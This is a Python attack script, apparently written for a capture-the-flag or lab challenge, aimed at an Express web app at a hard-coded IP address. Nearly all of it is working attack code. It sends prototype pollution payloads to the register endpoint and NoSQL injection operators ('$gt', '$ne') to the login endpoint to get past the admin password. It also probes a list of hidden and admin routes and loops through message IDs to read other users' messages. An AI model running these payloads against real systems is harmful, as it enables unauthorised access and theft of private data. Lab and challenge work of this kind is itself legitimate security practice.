import requests
import re
import json

base = 'http://154.57.164.80:31506'

# Key insight: Express app, CSP allows googleapis.com
# Let me look at this from a different angle

# 1. Try prototype pollution via JSON content-type on register
print("=== PROTOTYPE POLLUTION VIA JSON ===")
s = requests.Session()

# Register with JSON and try __proto__ pollution
pp_payloads = [
    {"username": "pp_test1", "password": "pass123", "__proto__": {"role": "admin"}},
    {"username": "pp_test2", "password": "pass123", "__proto__": {"isAdmin": True}},
    {"username": "pp_test3", "password": "pass123", "constructor": {"prototype": {"isAdmin": True}}},
]

for payload in pp_payloads:
    s2 = requests.Session()
    r = s2.post(f'{base}/register', json=payload, allow_redirects=False)
    print(f"  JSON register: status={r.status_code}, body={r.text[:200]}")

# 2. Maybe the app accepts JSON for login too - try with content-type application/json
print("\n=== JSON LOGIN ATTEMPTS ===")
s3 = requests.Session()
r = s3.post(f'{base}/login', json={"username": "admin", "password": {"$gt": ""}}, allow_redirects=False)
print(f"  NoSQL via JSON: status={r.status_code} loc={r.headers.get('Location','')}")

r = s3.post(f'{base}/login', json={"username": "admin", "password": {"$ne": "wrong"}}, allow_redirects=False)
print(f"  NoSQL $ne via JSON: status={r.status_code} loc={r.headers.get('Location','')}")

# Try with array values (Express body-parser may handle arrays)
r = s3.post(f'{base}/login', json={"username": ["admin"], "password": [""]}, allow_redirects=False)
print(f"  Array values: status={r.status_code} loc={r.headers.get('Location','')}")

# 3. Express session manipulation - try sending modified session cookie
print("\n=== SESSION ANALYSIS ===")
s4 = requests.Session()
s4.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})
for c in s4.cookies:
    print(f"  Cookie: {c.name}={c.value[:50]}...")
    print(f"  Domain={c.domain}, Path={c.path}")

# 4. Try if there's an API endpoint or hidden routes
print("\n=== SCANNING MORE ENDPOINTS ===")
s5 = requests.Session()
s5.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})
paths = [
    '/api/v1/messages', '/api/v1/users', '/graphql', '/graphiql',
    '/v1/messages', '/v1/users',
    '/health', '/healthz', '/ping', '/version', '/info',
    '/swagger', '/docs', '/openapi.json',
    '/messages.json', '/inbox', '/inbox.json',
    '/.well-known/', '/sitemap.xml',
    '/admin/panel', '/admin/dashboard',
    '/search', '/messages/search',
    '/source', '/debug/vars',
    '/messages/all',
    '/users/admin', '/users/admin/messages',
    '/user/admin', '/profile/admin',
]
for path in paths:
    r = s5.get(f'{base}{path}', allow_redirects=False)
    if r.status_code not in (404,):
        print(f"  {path}: status={r.status_code}")
        if r.status_code == 200:
            print(f"    Body: {r.text[:200]}")
        elif r.status_code in (301, 302):
            print(f"    Redirect: {r.headers.get('Location','')}")

# 5. Try accessing messages with different user context  
# What if messages aren't properly scoped to users?
print("\n=== CHECKING MESSAGE AUTHORIZATION ===")
# Login as different user and try to access message 10 (belongs to testuser1)
s6 = requests.Session()
s6.post(f'{base}/register', data={'username': 'other_user77', 'password': 'pass123'})
s6.post(f'{base}/login', data={'username': 'other_user77', 'password': 'pass123'})

# Try to read messages belonging to testuser1
for mid in range(1, 50):
    r = s6.get(f'{base}/messages/{mid}')
    if r.status_code == 200:
        match = re.search(r'From: (.*?)</strong>', r.text)
        frm = match.group(1) if match else '?'
        content_match = re.search(r'letter-copy">(.*?)</pre>', r.text, re.DOTALL)
        content = content_match.group(1)[:80] if content_match else '?'
        print(f"  Message {mid}: ACCESSIBLE! From: {frm}, Content: {content}")
    elif r.status_code != 404:
        print(f"  Message {mid}: status={r.status_code}")
